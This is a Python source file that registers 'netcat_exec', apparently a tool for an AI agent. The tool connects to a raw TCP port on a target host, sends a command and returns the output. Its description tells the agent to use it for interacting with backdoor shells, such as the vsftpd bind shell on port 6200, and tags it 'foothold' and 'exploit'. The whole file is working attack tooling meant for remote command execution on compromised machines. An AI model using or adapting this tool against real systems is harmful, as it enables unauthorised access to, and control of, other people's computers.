import socket
import time
from tools.registry import register
from tools.base import Tool, Param

def _netcat_exec(args: dict) -> dict:
    target_ip = args["target_ip"]
    port = args["port"]
    command = args.get("command", "")
    timeout = args.get("timeout", 10)

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((target_ip, port))
            
            time.sleep(0.5)
            
            s.sendall(b"\n")
            time.sleep(0.5)
            
            if command:
                s.sendall(f"{command}\n".encode())
            
            time.sleep(1)
            
            response = b""
            try:
                s.settimeout(3)
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                pass
            
            return {
                "cmd": f"netcat_exec {target_ip}:{port} '{command}'",
                "code": 0,
                "stdout": response.decode(errors="ignore"),
                "stderr": ""
            }
    except Exception as e:
        return {
            "cmd": f"netcat_exec {target_ip}:{port} '{command}'",
            "code": 1,
            "stdout": "",
            "stderr": str(e)
        }

netcat_exec = register(Tool(
    name="netcat_exec",
    description=(
        "Connects to a raw TCP port (like a bind shell opened by vsftpd on port 6200) "
        "and executes a command. Sends the command followed by a newline and returns "
        "the output. Use this to interact with backdoor shells."
    ),
    params=[
        Param("target_ip", "string", "IP address of the target."),
        Param("port", "integer", "TCP port where the shell is listening (e.g., 6200 for vsftpd backdoor)."),
        Param("command", "string", "The command to execute on the remote shell."),
        Param("timeout", "integer", "Connection and read timeout in seconds.", required=False),
    ],
    execute_fn=_netcat_exec,
    category=["foothold", "exploit"]
))